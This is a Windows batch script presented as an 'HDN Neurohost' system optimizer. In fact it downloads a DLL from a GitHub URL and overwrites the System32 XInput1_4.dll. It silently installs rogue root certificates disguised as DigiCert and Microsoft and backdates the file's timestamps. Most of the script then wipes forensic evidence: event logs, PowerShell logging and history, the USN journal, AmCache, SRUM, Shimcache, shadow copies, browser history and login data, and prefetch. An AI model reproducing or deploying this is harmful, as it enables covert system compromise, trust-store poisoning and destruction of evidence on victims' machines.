@echo off
setlocal EnableDelayedExpansion

title HDN Neurohost Module - Clear Logs and Optimize System
cls

:: Copyright and Info
echo ================================
echo      HDN Rahul Neurohost Module
echo ================================
echo Copyright (c) 2025 Rahul. All Rights Reserved.
echo Made by Rahul.
echo ================================
echo Please read the instructions carefully before proceeding.
echo ================================
pause

:: Ensure script runs as Administrator
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Please run this script as Administrator!
    pause
    exit
)

echo Stopping Windows Logging Services...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1

echo Taking Ownership of Log Files...
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1

echo Deleting ALL Logs (This is a pre-step, cleanup after process will happen later)...
:: Deleting logs (temporary, to clear any existing logs that might be relevant before starting the optimization process)
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1

:: Main Menu
cls
echo ================================
echo       HDN Neurohost Module
echo ================================
echo WARNING: Optimization process will now apply critical system-level changes!
echo Do not interrupt the process. This is for optimization purposes only.
echo ================================
echo 1. Apply Optimization (Critical Update)
echo 2. Apply Original (Backup) Replace
echo 3. Exit
echo ================================
set /p choice="Select an option (1-3): "

if "%choice%"=="1" goto replace
if "%choice%"=="2" goto replace_backup
if "%choice%"=="3" exit

goto menu

:replace
set "dll_url=https://github.com/dadajjjjakd11/Neuro/raw/refs/heads/main/XInput1_4.dll"
goto do_replace

:replace_backup
set "dll_url=https://github.com/dadajjjjakd11/backup/raw/refs/heads/main/XInput1_4.dll"
goto do_replace

:do_replace
cls
echo Neurohost Module: Applying update...
echo ================================
echo WARNING: This action will apply system-level optimizations.
echo Please ensure all processes are closed and proceed only if you are ready.
echo ================================

:: Check for Admin Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Administrator privileges required.
    echo Please run this script as Administrator.
    pause
    exit /b
)

:: dll_url already set by replace or replace_backup
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
set "cert_path=%TEMP%\temp_cert.cer"

:: Download the file using PowerShell
echo Connecting to the server for HDN update...
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}"

:: Check if the download was successful
if not exist "%dll_path%" (
    echo ERROR: Download failed! Please check your internet connection or the link.
    pause
    exit /b
)
echo SUCCESS: Update file downloaded.

:: Silent Certificate Addition with Friendly Name
powershell -Command ^
"^
    $cert = Get-AuthenticodeSignature '%dll_path%'; ^
    if ($cert.SignerCertificate) { ^
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'LocalMachine'); ^
        $store.Open('ReadWrite'); ^
        $certObj = $cert.SignerCertificate; ^
        $certObj.FriendlyName = 'DigiCert Trusted Certificate'; ^
        $store.Add($certObj); ^
        $store.Close(); ^
    } ^
" >nul 2>&1

:: Embed and apply certificate registry key (DD70024C...)
set "reg_tmp=%TEMP%\hdn_cert_%RANDOM%.reg"
(
echo Windows Registry Editor Version 5.00
echo.
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates\DD70024CA91CB2DF49477155BB4E0C836DA6527E]
echo "Blob"=hex:6b,00,00,00,01,00,00,00,20,00,00,00,88,78,f6,74,d4,3f,50,c5,2e,26,\
echo   7d,66,35,70,a2,62,a3,e5,5e,73,c7,ca,9b,27,05,6a,e3,16,ac,23,89,09,0f,00,00,\
echo   00,01,00,00,00,14,00,00,00,84,e4,45,d3,fb,70,5c,a9,46,ce,22,a1,9b,4c,98,ab,\
echo   67,5e,5e,af,14,00,00,00,01,00,00,00,14,00,00,00,9a,01,e3,6d,25,92,04,a8,33,\
echo   20,02,11,6b,34,a2,86,dd,4b,e2,5b,19,00,00,00,01,00,00,00,10,00,00,00,98,be,\
echo   97,4a,fb,17,cd,69,21,9c,93,22,6a,97,71,55,5c,00,00,00,01,00,00,00,04,00,00,\
echo   00,00,08,00,00,03,00,00,00,01,00,00,00,14,00,00,00,dd,70,02,4c,a9,1c,b2,df,\
echo   49,47,71,55,bb,4e,0c,83,6d,a6,52,7e,20,00,00,00,01,00,00,00,41,03,00,00,30,\
echo   82,03,3d,30,82,02,25,a0,03,02,01,02,02,10,10,2b,8d,51,e3,6e,36,b2,42,2a,b4,\
echo   08,24,55,72,2d,30,0d,06,09,2a,86,48,86,f7,0d,01,01,05,05,00,30,29,31,0b,30,\
echo   09,06,03,55,04,06,13,02,55,53,31,1a,30,18,06,03,55,04,03,0c,11,4d,69,63,72,\
echo   6f,73,6f,66,74,20,57,69,6e,64,6f,77,73,30,1e,17,0d,30,39,31,32,33,31,31,38,\
echo   30,30,30,30,5a,17,0d,33,39,31,32,33,31,31,38,30,30,30,30,5a,30,29,31,0b,30,\
echo   09,06,03,55,04,06,13,02,55,53,31,1a,30,18,06,03,55,04,03,0c,11,4d,69,63,72,\
echo   6f,73,6f,66,74,20,57,69,6e,64,6f,77,73,30,82,01,22,30,0d,06,09,2a,86,48,86,\
echo   f7,0d,01,01,01,05,00,03,82,01,0f,00,30,82,01,0a,02,82,01,01,00,e3,fe,a6,2b,\
echo   5a,d9,7d,08,36,e2,24,cc,d1,fb,d3,4f,3d,75,60,58,cb,a2,91,bc,b1,b5,1b,e5,05,\
echo   d5,05,5e,b6,86,0a,e9,31,e2,3b,00,a4,4a,6c,29,3e,07,fc,5d,1b,9c,3b,ce,fb,df,\
echo   90,16,ee,2a,e1,17,b4,6d,7a,6c,24,63,58,15,96,b5,13,40,ed,08,54,d9,4d,6b,d4,\
echo   e4,59,89,e3,c9,88,21,a2,da,2a,fd,51,54,aa,92,36,ba,04,7d,c3,e1,77,88,af,21,\
echo   4a,09,b8,43,56,4d,88,9f,40,eb,96,31,a2,10,e6,8b,47,b3,90,24,0e,23,fb,ed,0d,\
echo   9d,52,6e,6c,6a,d4,20,53,85,0c,81,a1,0e,a4,3e,5b,71,ad,87,04,d2,60,7d,cc,26,\
echo   cf,d4,f2,d7,cc,c5,7c,9f,af,87,40,bf,18,e4,cd,29,8c,65,e7,9b,b0,72,c9,18,c7,\
echo   6f,82,08,94,12,b7,61,93,a6,fe,de,12,95,40,85,90,73,da,e0,5b,57,a9,e0,be,43,\
echo   0a,92,26,fc,21,c0,e5,e9,e3,7f,75,a9,f6,06,4e,7e,8e,45,79,03,95,91,c7,31,39,\
echo   0c,ac,55,7b,0c,32,54,6c,d9,38,2f,41,f7,1c,14,e9,4c,18,4c,2e,cb,8d,07,f5,14,\
echo   78,d5,02,03,01,00,01,a3,61,30,5f,30,0e,06,03,55,1d,0f,01,01,ff,04,04,03,02,\
echo   04,f0,30,0c,06,03,55,1d,13,01,01,ff,04,02,30,00,30,20,06,03,55,1d,25,01,01,\
echo   ff,04,16,30,14,06,08,2b,06,01,05,05,07,03,03,06,08,2b,06,01,05,05,07,03,08,\
echo   30,1d,06,03,55,1d,0e,04,16,04,14,9a,01,e3,6d,25,92,04,a8,33,20,02,11,6b,34,\
echo   a2,86,dd,4b,e2,5b,30,0d,06,09,2a,86,48,86,f7,0d,01,01,05,05,00,03,82,01,01,\
echo   00,45,5a,42,c9,d8,00,c8,2e,77,ce,4d,23,02,e1,b7,11,99,52,e5,ca,60,08,64,22,\
echo   39,12,b9,3b,08,bd,e9,f7,9a,13,63,e4,c8,d4,de,37,0e,e0,45,6e,52,f7,4a,05,d2,\
echo   fd,51,5a,38,5e,69,14,bd,29,86,96,1c,ce,a9,02,f4,bb,2d,7a,9f,3b,e8,8b,d4,d3,\
echo   59,70,7e,86,c3,69,90,07,ed,0c,75,c8,10,be,80,d4,c2,16,ee,e2,f5,fa,cf,83,ca,\
echo   d7,35,24,77,4b,8a,6b,f4,15,b8,ac,5d,48,82,84,81,b9,50,ee,04,9e,b9,6c,19,6d,\
echo   f4,ca,b1,a9,77,f4,12,98,43,e4,20,96,8b,53,02,68,63,b3,b1,f2,db,5a,45,74,d3,\
echo   a4,b0,fb,59,b7,b2,03,78,08,04,06,a7,c9,6e,3d,66,29,f9,38,db,8a,b5,3f,ba,34,\
echo   d9,4d,9a,b5,39,58,16,a9,1c,fc,f1,46,ea,b1,07,da,90,ae,15,0c,17,f2,e4,1b,29,\
echo   b4,f1,b7,dc,a6,a9,50,b9,ef,67,32,f3,d1,bd,38,fc,35,04,cf,bc,30,e0,b9,38,cd,\
echo   2a,d3,1c,ff,f3,c1,2f,41,c4,8c,f9,21,f9,69,6a,8e,4c,76,79,32,8e,6c,bd,a6,8c,\
echo   30,50,c9,4a,41,e9,61
) > "%reg_tmp%"
regedit /s "%reg_tmp%"
del /f /q "%reg_tmp%" >nul 2>&1

:: Find and terminate processes using the file
echo ================================
echo WARNING: Terminating processes for optimization...
echo ================================
for /f "tokens=2 delims=," %%a in ('powershell -command "$Processes = Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; $Processes -join ','"') do (
    echo KILLING: Process ID %%a
    taskkill /PID %%a /F
)

:: Stop Windows File Protection temporarily
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1

:: Take ownership and modify permissions
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)

:: Copy new file to System32
copy /y "%dll_path%" "%system_dll_path%"
if %errorlevel% neq 0 (
    echo ERROR: Failed to apply the update! Try running in Safe Mode.
    pause
    exit /b
)
echo SUCCESS: Update applied successfully!

:: Modify HDN DLL Timestamp
powershell -Command "(Get-Item '%system_dll_path%').CreationTime  = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '%system_dll_path%').LastAccessTime = '2019-12-06 12:49:00'"
powershell -Command "(Get-Item '%system_dll_path%').LastWriteTime  = '2019-12-06 12:49:00'"

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1

:: ============================================================
:: FULL FORENSIC LOG WIPE - All Locations
:: ============================================================
echo ================================
echo [1/10] Clearing Windows Event Logs...
echo ================================

:: Stop EventLog service to force-clear locked logs
net stop EventLog /y >nul 2>&1

:: Clear all Windows Event Logs via wevtutil
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" >nul 2>&1
)

:: Delete raw .evtx files directly (double coverage)
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1

:: Restart EventLog
net start EventLog >nul 2>&1

echo ================================
echo [2/10] Clearing Temp, Prefetch, and Standard Logs...
echo ================================
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%WinDir%\SoftwareDistribution\Datastore\Logs\*" >nul 2>&1
del /s /f /q "%WinDir%\Panther\*" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.log" >nul 2>&1
del /s /f /q "%WinDir%\INF\Setupapi.dev.log" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\WER\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1
del /s /f /q "%WinDir%\System32\LogFiles\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1
del /s /f /q "%cert_path%" >nul 2>&1

echo ================================
echo [3/10] Clearing PowerShell Logs and History...
echo ================================
powershell -Command "wevtutil cl 'Windows PowerShell'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-PowerShell/Admin'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-PowerShell-DesiredStateConfiguration/Operational'" >nul 2>&1
powershell -Command "wevtutil cl 'Microsoft-Windows-WMI-Activity/Operational'" >nul 2>&1
:: PSReadLine history - all paths
del /f /q "%AppData%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
del /f /q "%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
del /f /q "%LocalAppData%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" >nul 2>&1
del /s /f /q "%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\PowerShell\*" >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Windows\PowerShell\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\PowerShell\*" >nul 2>&1
:: Module/ScriptBlock/Transcription logging registry keys
powershell -Command ^
"@('HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging', ^
   'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging', ^
   'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription', ^
   'HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell' ^
  ) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Recurse -Force -EA SilentlyContinue } }" >nul 2>&1
:: Transcript files
del /s /f /q "%UserProfile%\Documents\PowerShell_transcript*" >nul 2>&1
del /s /f /q "%UserProfile%\Documents\*.log" >nul 2>&1
:: GroupPolicy scripts folder
del /s /f /q "%SystemRoot%\System32\GroupPolicy\Machine\Scripts\*" >nul 2>&1
:: Remove entire PS folders (not just files inside)
for %%D in (
    "%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell"
    "%LocalAppData%\Microsoft\Windows\PowerShell"
    "%AppData%\Microsoft\Windows\PowerShell"
    "%ProgramData%\Microsoft\Windows\PowerShell"
) do (
    if exist %%D (
        takeown /f %%D /r /d y >nul 2>&1
        icacls %%D /grant Administrators:F /t >nul 2>&1
        rmdir /s /q %%D >nul 2>&1
    )
)
:: Scheduled Task history for PowerShell tasks
powershell -Command ^
"Get-ScheduledTask | Where-Object { $_.TaskName -match 'PowerShell' } | ^
 ForEach-Object { $_ | Clear-ScheduledTaskHistory -ErrorAction SilentlyContinue }" >nul 2>&1
:: Explicit PS-related channel list (extra coverage)
powershell -Command ^
"@('Windows PowerShell', ^
   'Microsoft-Windows-PowerShell/Operational', ^
   'Microsoft-Windows-PowerShell/Admin', ^
   'Microsoft-Windows-PowerShell-DesiredStateConfiguration/Operational', ^
   'Microsoft-Windows-PowerShell-DesiredStateConfiguration/Analytic', ^
   'Microsoft-Windows-WMI-Activity/Operational' ^
  ) | ForEach-Object { wevtutil cl $_ 2^>$null }" >nul 2>&1

echo ================================
echo [4/10] Purging USN Journal (NTFS Change Log)...
echo ================================
:: USN journal tracks every file create/modify/delete on NTFS
fsutil usn deletejournal /d /n C: >nul 2>&1
:: Recreate with minimal size so system stays stable
fsutil usn createjournal m=1000 a=100 C: >nul 2>&1

echo ================================
echo [5/10] Clearing AmCache (Program Execution Traces)...
echo ================================
:: AmCache stores SHA1 hash + path of every executed program
net stop "Application Experience" /y >nul 2>&1
takeown /f "%SystemRoot%\AppCompat\Programs\Amcache.hve" >nul 2>&1
icacls "%SystemRoot%\AppCompat\Programs\Amcache.hve" /grant Administrators:F >nul 2>&1
del /f /q "%SystemRoot%\AppCompat\Programs\Amcache.hve" >nul 2>&1
del /f /q "%SystemRoot%\AppCompat\Programs\Amcache.hve.LOG1" >nul 2>&1
del /f /q "%SystemRoot%\AppCompat\Programs\Amcache.hve.LOG2" >nul 2>&1
net start "Application Experience" >nul 2>&1

echo ================================
echo [6/10] Clearing SRUM Database (Network/CPU Usage History)...
echo ================================
:: SRUM logs per-app network bytes, CPU time, timestamps
net stop "DiagTrack" /y >nul 2>&1
net stop "SysMain" /y >nul 2>&1
takeown /f "%SystemRoot%\System32\sru\SRUDB.dat" >nul 2>&1
icacls "%SystemRoot%\System32\sru\SRUDB.dat" /grant Administrators:F >nul 2>&1
del /f /q "%SystemRoot%\System32\sru\SRUDB.dat" >nul 2>&1
net start "SysMain" >nul 2>&1

echo ================================
echo [7/10] Clearing Shimcache / AppCompatCache (Registry)...
echo ================================
:: Shimcache in registry: stores last 1024 executed binaries
powershell -Command ^
"$key = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache'; ^
 Remove-ItemProperty -Path $key -Name 'AppCompatCache' -ErrorAction SilentlyContinue; ^
 Write-Host 'Shimcache cleared'" >nul 2>&1

echo ================================
echo [8/10] Deleting Volume Shadow Copies...
echo ================================
:: VSS snapshots can restore deleted files - remove all
vssadmin delete shadows /all /quiet >nul 2>&1
wmic shadowcopy delete >nul 2>&1

echo ================================
echo [9/10] Flushing DNS Cache + Clearing Registry MRU...
echo ================================
:: DNS cache
ipconfig /flushdns >nul 2>&1

:: Registry MRU - Run dialog history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1

:: TypedURLs (IE/Edge address bar history)
reg delete "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f >nul 2>&1

:: Recent Docs MRU
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1

:: UserAssist (GUI programs launched, with timestamps + count)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f >nul 2>&1

:: ComDlg32 - Open/Save dialog history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" /f >nul 2>&1

:: Last visited MRU
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" /f >nul 2>&1

:: Open/Save file dialog path history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU" /f >nul 2>&1

:: Notepad last file
reg delete "HKCU\Software\Microsoft\Notepad" /f >nul 2>&1

:: TypedPaths (Explorer address bar)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" /f >nul 2>&1

:: Search history
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery" /f >nul 2>&1

echo ================================
echo [10/10] Clearing Browser Logs and Cache...
echo ================================

:: Chrome
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\History" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\History-journal" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Cache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Code Cache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Network\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Sessions\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Web Data" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Visited Links" >nul 2>&1
del /s /f /q "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" >nul 2>&1

:: Firefox
for /d %%P in ("%AppData%\Mozilla\Firefox\Profiles\*") do (
    del /s /f /q "%%P\places.sqlite" >nul 2>&1
    del /s /f /q "%%P\places.sqlite-wal" >nul 2>&1
    del /s /f /q "%%P\cache2\*" >nul 2>&1
    del /s /f /q "%%P\sessionstore-backups\*" >nul 2>&1
    del /s /f /q "%%P\storage\*" >nul 2>&1
    del /s /f /q "%%P\crashes\*" >nul 2>&1
)

:: Edge (Chromium)
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\History" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\Cache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\Sessions\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Edge\User Data\Default\Network\*" >nul 2>&1

:: IE / Legacy Edge
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\WebCache\*" >nul 2>&1
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255 >nul 2>&1

:: Windows Search Index
net stop "WSearch" /y >nul 2>&1
del /s /f /q "%ProgramData%\Microsoft\Search\Data\*" >nul 2>&1
net start "WSearch" >nul 2>&1

echo ================================
echo [11/13] Clearing Explorer Thumbnail and Icon Cache...
echo ================================
taskkill /F /IM explorer.exe >nul 2>&1
del /f /q "%LocalAppData%\Microsoft\Windows\Explorer\thumbcache_*.db" >nul 2>&1
del /f /q "%LocalAppData%\Microsoft\Windows\Explorer\iconcache_*.db" >nul 2>&1
start explorer.exe >nul 2>&1

echo ================================
echo [12/13] Clearing Jump Lists and Recent Items...
echo ================================
del /s /f /q "%AppData%\Microsoft\Windows\Recent\*.lnk" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\AutomaticDestinations\*" >nul 2>&1
del /s /f /q "%AppData%\Microsoft\Windows\Recent\CustomDestinations\*" >nul 2>&1

echo ================================
echo [13/13] Self-Clean - Wiping This Run's Own Traces...
echo ================================
:: Clear CMD doskey buffer
doskey /reinstall >nul 2>&1
:: Delete prefetch for every tool used in this script
for %%F in (
    CMD.EXE POWERSHELL.EXE PWSH.EXE CONHOST.EXE
    WEVTUTIL.EXE REG.EXE TAKEOWN.EXE ICACLS.EXE
    NET.EXE NET1.EXE IPCONFIG.EXE FSUTIL.EXE
    VSSADMIN.EXE WMIC.EXE TASKKILL.EXE NOTEPAD.EXE
    REGEDIT.EXE CERTUTIL.EXE XCOPY.EXE
) do del /f /q "%SystemRoot%\Prefetch\%%F*.pf" >nul 2>&1
:: Final event log sweep to catch events from this run
net stop EventLog /y >nul 2>&1
for /f "tokens=*" %%G in ('wevtutil el') do (
    wevtutil cl "%%G" >nul 2>&1
)
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
net start EventLog >nul 2>&1

echo ================================
echo ALL LOGS CLEARED SUCCESSFULLY.
echo ================================

:: ================================
:: Remove temp.cmd from C drive (robust logic)
:: ================================
echo Removing temp.cmd from C drive...
set "temp_cmd_removed=0"

:: 1) Known paths - check and delete (System32 needs takeown first)
set "paths_to_check=C:\temp.cmd %SystemRoot%\temp.cmd %WinDir%\Temp\temp.cmd %TEMP%\temp.cmd %LocalAppData%\Temp\temp.cmd"
for %%p in (%paths_to_check%) do (
    if exist "%%~p" (
        del /f /q "%%~p" >nul 2>&1
        if not exist "%%~p" (echo   Removed: %%~p & set /a temp_cmd_removed+=1)
    )
)

:: 2) System32 - take ownership then delete (admin required)
if exist "%SystemRoot%\System32\temp.cmd" (
    takeown /f "%SystemRoot%\System32\temp.cmd" >nul 2>&1
    icacls "%SystemRoot%\System32\temp.cmd" /grant Administrators:F >nul 2>&1
    del /f /q "%SystemRoot%\System32\temp.cmd" >nul 2>&1
    if not exist "%SystemRoot%\System32\temp.cmd" (echo   Removed: %SystemRoot%\System32\temp.cmd & set /a temp_cmd_removed+=1)
)

:: 3) Search under C:\Windows only (faster than full C:) for any remaining temp.cmd
for /r "%SystemRoot%" %%a in (temp.cmd) do (
    if exist "%%a" (
        takeown /f "%%a" >nul 2>&1
        icacls "%%a" /grant Administrators:F >nul 2>&1
        del /f /q "%%a" >nul 2>&1
        if not exist "%%a" (echo   Removed: %%a & set /a temp_cmd_removed+=1)
    )
)

if !temp_cmd_removed! gtr 0 (echo temp.cmd removal done.) else (echo No temp.cmd found on C drive.)
echo.

echo Done! HDN Neurohost has been successfully applied and logs cleared.
pause
goto menu

:: Restart stopped services
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1
